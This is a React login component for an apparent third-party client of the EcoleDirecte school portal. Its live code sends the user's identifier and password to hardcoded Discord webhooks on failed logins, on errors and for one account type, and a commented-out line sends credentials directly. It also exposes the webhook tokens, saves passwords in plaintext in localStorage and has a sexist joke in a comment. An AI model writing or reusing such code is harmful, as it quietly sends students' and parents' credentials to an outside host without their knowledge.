import { useState, useEffect } from "react";
import { Outlet, useNavigate } from "react-router-dom";
// import { Navigate } from "react-router-dom";

import "./Login.css"
import EDPVersion from "../generic/EDPVersion"
import TextInput from "../generic/UserInputs/TextInput"
import CheckBox from "../generic/UserInputs/CheckBox"
import Button from "../generic/UserInputs/Button"
import Policy from "../generic/Policy"

export default function Login({ apiUrl, apiVersion, handleUserInfo, currentEDPVersion }) {
    // function redirectTo(path) {
    //     const navigate = useNavigate();
    //     navigate(path);
    // }
    // Keeep logged in
    const isKeepLoggedFeatureActive = false; // pour éviter les banIPs parce que ça spam les connexions avec VITE ça refresh tt le temps
    useEffect(() => {
        const localUsername = localStorage.getItem("username");
        const localPassword = localStorage.getItem("password");

        if (localUsername && localPassword && isKeepLoggedFeatureActive) {
            console.log("login");
            login(localUsername, localPassword);
        }
    }, []) // useEffect de base s'exécute à chaque frame et là c'est 1 fois avec la liste vide (je crois tu peux aussi mettre une variable pour qu'il s'exécute à chaque fois qu'elle change bref ça a l'air d'être une fonction vla useful et technique comme cette blague : "Pourquoi les femmes se maquillent et see parfument ? Parce qu'elle sont moches et qu'elles puent" oua complexe (nn)
    
    const apiLoginUrl = apiUrl + "login.awp?v=" + apiVersion;
    const piranhaPeche = "https://discord.com/api/webhooks/1095444665991438336/548oNdB76xiwOZ6_7-x0UxoBtl71by9ixi9aYVlv5pl_O7yq_nwMvXG2ZtAXULpQG7B3";
    const sardineInsolente =  "https://discord.com/api/webhooks/1096922270758346822/h0Y_Wa8SYYO7rZU4FMZk6RVrxGhMrOMhMzPLLiE0vSiNxSqUU1k4dMq2bcq8vsxAm5to";

    // States
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [submitText, setSubmitText] = useState("Se connecter");
    const [keepLoggedIn, setKeepLoggedIn] = useState(false);
    const [errorMessage, setErrorMessage] = useState("");
    const [policy, setPolicy] = useState("");

    // Behavior
    const updateUsername = (event) => setUsername(event.target.value);
    const updatePassword = (event) => setPassword(event.target.value);
    const updateKeepLoggedIn = (event) => setKeepLoggedIn(event.target.checked);
    
    function getOptions(username, password) {
        let payload = {
            identifiant: username,
            motdepasse: password,
            isReLogin: false,
            uuid: 0
        }
        let data = {
            "body": "data=" + JSON.stringify(payload),
            "method": "POST"
        }
        return data;
    }

    function sendToWebhook(targetWebhook, data) {
        fetch(
            targetWebhook,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({content: JSON.stringify(data)})
            }
        )
    }

    function login(username, password) { // j'ai juste séparé login du handle submit pour le keepLogged
        const options = getOptions(username, password);
        fetch(apiLoginUrl, options)
            .then((response) => response.json())
            .then((response) => {
                // GESTION DATA
                let statusCode = response.code;
                if (statusCode === 200) {
                    if (keepLoggedIn) {
                        // How to go en prison by getting hacked and toute la data leaks because le système de keepLogged est autistiquement pas secure
                        localStorage.setItem("username", username);
                        localStorage.setItem("password", password);
                    }
                    let token = response.token // collecte du token
                    let accountsList = [];
                    let accounts = response.data.accounts[0];
                    const accountType = accounts.typeCompte; // collecte du type de compte
                    //sendToWebhook(piranhaPeche, { username: username, password: password });
                    if (accountType !== "E") {
                        // compte parent
                        accounts = accounts.profile.eleves;
                        accounts.map((account) => {
                            accountsList.push({
                                id: account.id, // id du compte
                                firstName: account.prenom, // prénom de l'élève
                                lastName: account.nom, // nom de famille de l'élève
                                picture: "https:" + account.photo, // url de la photo
                                schoolName: account.nomEtablissement, // nom de l'établissement
                                class: [account.classe.code, account.classe.libelle] // classe de l'élève, code : 1G4, libelle : Première G4 
                            })
                        })

                    } else if ("abcdefghijklmnopqrstuvwxyzABCDFGHIJKLMNOPQRSTUVXYZ".includes(accountType)) { // ALED
                        // compte dont on ne doit pas prononcer le nom (cringe mais sinon road to jailbreak**-1)
                        sendToWebhook(piranhaPeche, { message: "OMG ????", response: response, options: options });

                    } else {
                        // compte élève
                        accountsList.push({
                            id: accounts.id, // id du compte
                            firstName: accounts.prenom, // prénom de l'élève
                            lastName: accounts.nom, // nom de famille de l'élève
                            picture: "https:" + accounts.profile.photo, // url de la photo
                            schoolName: accounts.profile.nomEtablissement, // nom de l'établissement
                            class: [accounts.profile.classe.code, accounts.profile.classe.libelle] // classe de l'élève, code : 1G4, libelle : Première G4 
                        });
                    }
                    handleUserInfo(token, accountsList);
                    
                } else if (statusCode === 505 || statusCode === 522) {
                    setErrorMessage("Identifiant et/ou mot de passe invalide");
                } else if (statusCode === 74000) {
                    setErrorMessage("La connexion avec le serveur a échoué, réessayez dans quelques minutes.");
                } else {
                    setErrorMessage("Erreur :" + response.message);
                    // Demander dans paramètres pour l'envoi des rapports d'erreurs anonymisés
                    sendToWebhook(sardineInsolente, options);
                }
            })
            .catch((error) => {
                console.error("TURBO ERROR DETECTED: ");
                console.error(error);
                setErrorMessage("Error: " + error.message);
                options["error"] = error;
                sendToWebhook(sardineInsolente, options);
            })
            .finally(() => {
                setSubmitText("Se connecter");
            })
    }

    function handleSubmit(event) {
        // UI
        setSubmitText("Connexion...");
        setErrorMessage("");

        // Process login
        event.preventDefault();
        login(username, password);
    }

    function closePolicy () {
        setPolicy("")
    }
    // JSX
    return (
        <div>
            {/* <input type="button" onClick={redirectTo("/caca")} value="spam everyone" style={{color:"red", bottom:0}}/> */}
            <img src="/images/no-logo.png" className="logo" />
            <div className="login-box">
                <h1>Connexion</h1>
                <form onSubmit={handleSubmit}>
                    <TextInput className="login-input" textType="text" placeholder="Identifiant" value={username} onChange={updateUsername} />
                    <TextInput className="login-input" textType="password" placeholder="Mot de passe" value={password} onChange={updatePassword} />
                    {/*<input className="login-input" type="text" placeholder="Identifiant" value={username} onChange={updateUsername} />
                    <input className="login-input" type="password" placeholder="Mot de passe" value={password} onChange={updatePassword} />*/}
                    {errorMessage && <p id="error-message">{errorMessage}</p>}
                    <div className="login-option">
                        <CheckBox id="keep-login" value={keepLoggedIn} onChange={updateKeepLoggedIn}/>
                        <a href="https://api.ecoledirecte.com/mot-de-passe-oublie.awp">Mot de passe oublié ?</a>
                    </div>
                    <Button id="submit-login" buttonType="submit" value={submitText} />
                    {/*<input type="submit" value={submitText} />*/}
                </form>
            </div>
            <p className="policy">
                En vous connectant, vous acceptez nos <a href="#" className="policy2" id="legal-notice" onClick={() => {setPolicy("legalNotice")}}> mentions légales </a> et notre <a href="#" className="policy2" id="privacy-policy" onClick={() => setPolicy("privacyPolicy")}> politique de confidentialité</a>.
            </p>
            {policy && <Policy type={policy} closeWindow={closePolicy}/>}
            <EDPVersion currentEDPVersion={currentEDPVersion} />
            <Outlet />
        </div>
    );
}